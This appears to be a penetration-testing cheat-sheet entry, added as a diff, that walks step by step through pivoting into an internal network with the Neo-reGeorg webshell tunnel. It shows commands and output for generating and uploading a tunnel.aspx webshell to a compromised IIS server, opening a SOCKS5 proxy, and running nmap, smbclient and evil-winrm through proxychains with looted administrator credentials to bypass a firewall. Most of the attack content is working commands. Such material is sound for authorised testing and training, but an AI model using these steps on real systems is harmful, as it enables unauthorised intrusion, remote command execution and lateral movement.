@@ -1,0 +1,278 @@
+==================================================================================================================================
+Pivoting with Neo-reGeorg (basic example)
+==================================================================================================================================
+
+=> Github page "https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md"
+
+During an external penetration test, if you find a Web vulnerability that allows you to upload a Webshell on an Internet-facing Web server
+then you can use the tool Neo-reGeorg to create a TCP tunnel over HTTP between your attacker machine and the compromised Web server. 
+This will allow you to bypass the network perimeter firewall and pivot inside the target/client company's internal network.
+
+The Neo-reGeorg Web tunnels are stable with command line tools like smbclient, evil-winrm, impacket and netexec but not with RDP connections.
+
+
+Basic Usage
+------------
+> Step 1. Generate the Neo-reGeorg tunnel servers (i.e. Webshell files - aspx|ashx|jsp|jspx|php) and upload the relevant one on your target web server.
+
+	  $ python neoreg.py generate -k password
+
+> Step 2. Use python client "neoreg.py" to connect to the Neo-reGeorg Webshell hosted on the target web server and create a socks5 proxy locally.
+    Examples:
+	  $ python3 neoreg.py -k password -u http://X.X.X.X/tunnel.php
+	  $ python3 neoreg.py -k password -u http://X.X.X.X/tunnel.aspx
+	  $ python3 neoreg.py -k password -u http://X.X.X.X/tunnel.jsp
+    ...
+
+==================================================================================================================================
+Basic PoC - Step 1 - Take over a vulnerable Internet-facing website during an external penetration test
+==================================================================================================================================
+
+Let's say that we have compromised an Internet-facing (.net) website and uploaded a webshell.
+
+Using the webshell, we looted the server and found the clear-text password of a local administrator account hardcoded in a script 
+or a configuration file . 
+
+However, from our attacker machine located on the Internet we only have access to the vulnerable Website (HTTPs/443) and all the 
+other ports are obviously filtered by a network perimeter firewall.
+
+jeff@kali:~$ sudo nmap -sS -Pn -p 443,445,3389,5985,5986 XX.XX.XX.XX
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-05 00:34 CEST
+Nmap scan report for XX.XX.XX.XX
+Host is up (0.00022s latency).
+
+PORT     STATE  SERVICE
+443/tcp  open   https
+445/tcp  closed microsoft-ds
+3389/tcp closed ms-wbt-server
+5985/tcp closed wsman
+5986/tcp closed wsmans
+
+
+==================================================================================================================================
+Basic PoC - Step 2 - Generate an ".aspx" Neo-reGeorg Webshell
+==================================================================================================================================
+
+GitHub - https://github.com/L-codes/Neo-reGeorg/tree/master
+
+jeff@kali:~/Documents/Tools/Neo-reGeorg-master$ python3 neoreg.py generate -k SuperPassword2024
+
+
+          "$$$$$$''  'M$  '$$$@m
+        :$$$$$$$$$$$$$$''$$$$'
+       '$'    'JZI'$$&  $$$$'
+                 '$$$  '$$$$
+                 $$$$  J$$$$'
+                m$$$$  $$$$,
+                $$$$@  '$$$$_          Neo-reGeorg
+             '1t$$$$' '$$$$<
+          '$$$$$$$$$$'  $$$$          version 5.2.0
+               '@$$$$'  $$$$'
+                '$$$$  '$$$@
+             'z$$$$$$  @$$$
+                r$$$   $$|
+                '$$v c$$
+               '$$v $$v$$$$$$$$$#
+               $$x$$$$$$$$$twelve$$$@$'
+             @$$$@L '    '<@$$$$$$$$`
+           $$                 '$$$
+
+
+    [ Github ] https://github.com/L-codes/Neo-reGeorg
+
+    [+] Mkdir a directory: neoreg_servers
+    [+] Create neoreg server files:
+       => neoreg_servers/tunnel.jspx
+       => neoreg_servers/tunnel.jsp
+       => neoreg_servers/tunnel.php
+       => neoreg_servers/tunnel.ashx
+       => neoreg_servers/tunnel.cs
+       => neoreg_servers/tunnel.aspx
+       => neoreg_servers/tunnel.go
+
+jeff@kali:~/Documents/Tools/Neo-reGeorg-master$ ls -al
+total 144
+drwxr-xr-x  5 jeff jeff  4096 Aug  4 20:26 .
+drwxr-xr-x 67 jeff jeff  4096 Aug  4 20:05 ..
+-rw-r--r--  1 jeff jeff 10108 Jan 24  2024 CHANGELOG-en.md
+-rw-r--r--  1 jeff jeff  8532 Jan 24  2024 CHANGELOG.md
+drwxr-xr-x  3 jeff jeff  4096 Jan 24  2024 .github
+-rw-r--r--  1 jeff jeff    82 Jan 24  2024 .gitignore
+-rw-r--r--  1 jeff jeff 35070 Jan 24  2024 LICENSE
+-rwxr-xr-x  1 jeff jeff 38602 Jan 24  2024 neoreg.py
+drwxr-xr-x  2 jeff jeff  4096 Aug  4 20:26 neoreg_servers
+-rw-r--r--  1 jeff jeff  8700 Jan 24  2024 README-en.md
+-rw-r--r--  1 jeff jeff  8147 Jan 24  2024 README.md
+drwxr-xr-x  2 jeff jeff  4096 Jan 24  2024 templates
+
+jeff@kali:~/Documents/Tools/Neo-reGeorg-master$ cd neoreg_servers/
+
+jeff@kali:~/Documents/Tools/Neo-reGeorg-master/neoreg_servers$ ls -al
+total 108
+drwxr-xr-x 2 jeff jeff  4096 Aug  4 20:26 .
+drwxr-xr-x 5 jeff jeff  4096 Aug  4 20:26 ..
+-rw-r--r-- 1 jeff jeff    17 Aug  4 20:26 key.txt
+-rw-r--r-- 1 jeff jeff 10297 Aug  4 20:26 tunnel.ashx
+-rw-r--r-- 1 jeff jeff  9163 Aug  4 20:26 tunnel.aspx
+-rw-r--r-- 1 jeff jeff 12484 Aug  4 20:26 tunnel.cs
+-rw-r--r-- 1 jeff jeff  6677 Aug  4 20:26 tunnel.go
+-rw-r--r-- 1 jeff jeff 20247 Aug  4 20:26 tunnel.jsp
+-rw-r--r-- 1 jeff jeff 20460 Aug  4 20:26 tunnel.jspx
+-rw-r--r-- 1 jeff jeff  5859 Aug  4 20:26 tunnel.php
+
+
+==================================================================================================================================
+Basic PoC - Step 3 - Upload the Neo-reGeorg Webshell (.aspx version) on the compromised Web server (IIS in our example)
+==================================================================================================================================
+
+We upload the Neo-reGeorg Webshell "tunnel.aspx" on the IIS Web server hosting the vulnerable Website.
+
+> https://VulnerableWebsite/upload/tunnel.aspx
+> https://XX.XX.XX.XX/upload/tunnel.aspx
+
+
+==================================================================================================================================
+Basic PoC - Step 4 - Use "ProxyChains" and the Neo-reGeorg python client to connect to the Neo-reGeorg Webshell (tunnel server).
+                     This allow to bypass the perimeter firewall and browse the local file share (SMB) and run OS commands (WinRM) 
+                     on the Windows server hosting our Neo-reGeorg Webshell using the stolen creds found in Step 1.
+                     Note: we can also use the Web tunnel to scan and attack the internal network ...
+==================================================================================================================================
+
+jeff@kali:~/Documents/Tools/Neo-reGeorg-master$ cat /etc/proxychains.conf
+
+<SNIP>
+
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4  127.0.0.1 9050
+# socks4  127.0.0.1 4444
+socks5  127.0.0.1 1080
+
+<SNIP>
+
+
+jeff@kali:~/Documents/Tools/Neo-reGeorg-master$ python3 neoreg.py -k SuperPassword2024 -u http://XX.XX.XX.XX:8080/tunnel.aspx
+
+          "$$$$$$''  'M$  '$$$@m
+        :$$$$$$$$$$$$$$''$$$$'
+       '$'    'JZI'$$&  $$$$'
+                 '$$$  '$$$$
+                 $$$$  J$$$$'
+                m$$$$  $$$$,
+                $$$$@  '$$$$_          Neo-reGeorg
+             '1t$$$$' '$$$$<
+          '$$$$$$$$$$'  $$$$          version 5.2.0
+               '@$$$$'  $$$$'
+                '$$$$  '$$$@
+             'z$$$$$$  @$$$
+                r$$$   $$|
+                '$$v c$$
+               '$$v $$v$$$$$$$$$#
+               $$x$$$$$$$$$twelve$$$@$'
+             @$$$@L '    '<@$$$$$$$$`
+           $$                 '$$$
+
+    [ Github ] https://github.com/L-codes/Neo-reGeorg
+
++------------------------------------------------------------------------+
+  Log Level set to [ERROR]
+  Starting SOCKS5 server [127.0.0.1:1080]
+  Tunnel at:
+    http://XX.XX.XX.XX:8080/tunnel.aspx
++------------------------------------------------------------------------+
+
+
+=> The Neo-reGeorg Web tunnel is now available, we can open a new SSH prompt and use ProxyChains and the Neo-reGeorg python client to connect to the Neo-reGeorg Webshell.
+   This allows us to bypass the firewall and browse the local file share (SMB) and run OS commands (WinRM) on the Windows server hosting our Neo-reGeorg Webshell 
+   using the stolen creds found in Step 1. We use the localhost IP address "127.0.0.1" to target the Windows server.
+
+
+Example of a NMAP port scan going through the Neo-reGeorg Web tunnel 
+---------------------------------------------------------------------
+
+jeff@kali:~$ proxychains nmap -sT -Pn -p 443,445,3389,5985,5986 127.0.0.1
+ProxyChains-3.1 (http://proxychains.sf.net)
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-05 00:25 CEST
+|DNS-request| fd0f:ee:b0::1
+|S-chain|-<>-127.0.0.1:1080-<><>-4.2.2.2:53-<><>-OK
+|DNS-response|: fd0f:ee:b0::1 does not exist
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:443-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:445-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:3389-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5986-<--timeout
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5985-<><>-OK
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.18s latency).
+
+PORT     STATE  SERVICE
+443/tcp  open   https
+445/tcp  open   microsoft-ds
+3389/tcp open   ms-wbt-server
+5985/tcp open   wsman
+5986/tcp closed wsmans
+
+
+Example of a SMB connection going through the Neo-reGeorg Web tunnel 
+---------------------------------------------------------------------
+
+jeff@kali:~$ proxychains smbclient \\\\127.0.0.1\\C$ -U 'webserver\\Administrator'
+ProxyChains-3.1 (http://proxychains.sf.net)
+Password for [Administrator]:
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:445-<><>-OK
+Try "help" to get a list of possible commands.
+smb: \> dir
+  $Recycle.Bin                      DHS        0  Fri Jul  7 14:28:50 2023
+  6539bd0d86cc873760f52c99eb18        D        0  Sun Sep  3 20:05:56 2023
+  bootmgr                          AHSR   389408  Mon Nov 21 01:42:45 2016
+  BOOTNXT                           AHS        1  Sat Jul 16 15:18:08 2016
+  Documents and Settings          DHSrn        0  Sun Jan 29 23:31:10 2023
+  inetpub                             D        0  Thu Jul  4 00:29:11 2024
+  Microsoft                           D        0  Thu Jul  4 02:57:40 2024
+  nuget.exe                           A  8574512  Sun Jun  2 21:17:45 2024
+  pagefile.sys                      AHS 1874817024  Sun Aug  4 19:24:41 2024
+  PerfLogs                            D        0  Fri Feb  3 03:37:31 2023
+  Program Files                      DR        0  Sun Aug  4 22:34:19 2024
+  Program Files (x86)                 D        0  Sun Aug  4 20:31:17 2024
+  ProgramData                       DHn        0  Thu Jul  4 00:02:04 2024
+  Recovery                         DHSn        0  Sun Jan 29 23:31:12 2023
+  System Volume Information         DHS        0  Wed Jul  3 22:41:10 2024
+  temp                                D        0  Wed Mar  6 08:39:35 2024
+  Users                              DR        0  Thu Jul  4 01:28:52 2024
+  Windows                             D        0  Wed Jul  3 22:35:36 2024
+
+                12978687 blocks of size 4096. 3067199 blocks available
+smb: \>
+smb: \> exit
+
+jeff@kali:~$ 
+
+Example of a PowerShell remoting connection going through the Neo-reGeorg Web tunnel 
+-------------------------------------------------------------------------------------
+
+jeff@kali:~$ proxychains evil-winrm -i 127.0.0.1 -u Administrator
+Enter Password:
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Evil-WinRM shell v3.4
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5985-<><>-OK
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+*Evil-WinRM* PS C:\Users\Administrator\Documents> query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+ administrator         console             1  Active      none   04/08/2024 21:16
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> exit
+
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5985-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5985-<><>-OK
+
+Info: Exiting with code 0
